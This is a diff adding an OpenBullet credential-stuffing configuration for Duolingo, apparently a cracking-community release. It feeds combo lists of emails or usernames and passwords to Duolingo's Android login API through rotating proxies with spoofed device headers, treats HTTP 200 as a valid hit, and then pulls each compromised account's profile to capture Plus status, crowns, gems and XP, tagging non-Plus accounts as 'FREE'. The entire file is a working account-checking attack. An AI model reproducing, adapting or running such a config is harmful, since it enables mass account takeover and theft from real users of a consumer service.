@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Duolingo",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-16T00:10:18.7185595+02:00",
+  "AdditionalInfo": "Captures if Plus, Crowns, Lingots & XP",
+  "Author": "ND03",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://android-api.duolingo.com/2017-06-30/login?fields=id" 
+  CONTENT "{\"identifier\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Duodroid/4.51.5 Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: android-api.duolingo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#Profile REQUEST GET "https://android-api.duolingo.com/2017-06-30/users/<id>?fields=adsConfig%7Bunits%7D%2Cid%2CautoUpdatePreloadedCourses%2Cbio%2CcoachOutfit%2Ccourses%7BauthorId%2CfromLanguage%2Cid%2ChealthEnabled%2ClearningLanguage%2Cpreload%2Ctitle%2Cxp%2Ccrowns%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CemailWordOfTheDay%2Cexperiments%7Bandroid_delight_increase_arabic_text%2Candroid_delight_skill_level_up_animate%2Candroid_match_tool_tip_v2%2Candroid_retry_5xx_errors_v3%2Candroid_prefetch_all_skills%2Candroid_tv%2Candroid_tv_override%2Candroid_unified_home_messaging_ui_v2%2Candroid_welcome_fork_copy_v2%2Candroid_wechat_instruction_page_v2%2Casia_limit_coppa_experience_v2%2Casia_pause_plus_promo_v2%2Casia_pause_revenue_ID_IN_TH_VI%2Cchina_android_wechat_share_profile%2Cchina_android_yunpian_onelogin%2Cconnect_android_add_facebook_friends%2Cconnect_android_follow_email%2Cconnect_android_edit_own_avatar%2Cconnect_android_profile_redesign%2Cconnect_android_referral_banner_copy%2Cconnect_android_abbrev_followers%2Cdelight_challenge_anim_gating%2Clearning_android_keep_speak_tts_enabled%2Clearning_sg_adaptive_global_practice%2Clearning_sg_adaptive_skill_practice%2Cmidas_android_billing_reconnect_v1%2Cmidas_android_hard_mode%2Cmidas_android_immersive_hearts%2Cmidas_android_plus_ad_blindness_v3%2Cmidas_android_plus_carousel_v2%2Cmidas_android_plus_welcome_animation%2Cmidas_android_reduce_course_download%2Cmidas_android_rewarded_plus_promo_v3%2Cmidas_android_vertical_purchase_page%2Cnurr_android_improve_coppa_signup%2Cnurr_cannot_listen_button_placement%2Cretention_android_achievement_sparkles%2Cretention_android_achieve_animations%2Cretention_android_animate_streak_topbar%2Cretention_android_dg_anim_redesign_v2%2Cretention_android_early_streak_copy_v2%2Cretention_android_incorrect_copy%2Cretention_android_dg_lower_freeze_req%2Cretention_android_freeze_gift_no_dg%2Cretention_android_lls_progress_bar%2Cretention_android_more_streak_cal_des%2Cretention_android_onboarding_sparkles%2Cretention_android_perfect_sess_sparkles%2Cretention_android_remove_streak_num%2Cretention_android_rm_trumpet%2Cretention_android_skill_reward_copy_v2%2Cretention_android_sess_prog_sparkles%2Cretention_android_incr_freeze_prob%2Cretention_android_streak_cal_designs%2Cstories_android_autoscroll_v3%2Cstories_android_autoselect_tab%2Cstories_android_cant_listen_now%2Cstories_android_prioritize_se_prefetch%2Cstories_android_new_content_v2%2Cstories_android_remove_gating_v2%2Cstories_android_remove_part_complete%2Cstories_android_trophy%7D%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%7D%2CinviteURL%2CjoinedClassroomIds%2ClearningLanguage%2Clingots%2Clocation%2Cname%2CobservedClassroomIds%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings%2CpushAnnouncement%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CreferralInfo%7BhasReachedCap%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName%2CisEligibleForBonus%7D%2CrequiresParentalConsent%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId%2Ccurrency%2Camount%7D%7D%2Croles%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2Crenewer%2Crenewing%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%7D%2Cstreak%2CstreakData%7Blength%2CupdatedTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpConfig%7BmaxSkillTestXp%2CmaxCheckpointTestXp%2CmaxPlacementTestXp%7D%2CxpGoal%2CzhTw" 
+  
+  HEADER "Authorization: Bearer <HEADERS(jwt)>" 
+  HEADER "User-Agent: Duodroid/4.59.1 Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G965N Build/NRD90M)" 
+  HEADER "Accept: application/json" 
+
+#Plus PARSE "<SOURCE>" JSON "hasPlus" CreateEmpty=FALSE -> CAP "Plus" 
+
+#Crowns PARSE "<SOURCE>" JSON "crowns" CreateEmpty=FALSE -> CAP "Crowns" 
+
+#Lingots PARSE "<SOURCE>" JSON "gems" CreateEmpty=FALSE -> CAP "Lingots" 
+
+#XP PARSE "<SOURCE>" JSON "totalXp" CreateEmpty=FALSE -> CAP "XP" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Plus>" Contains "False" 
+
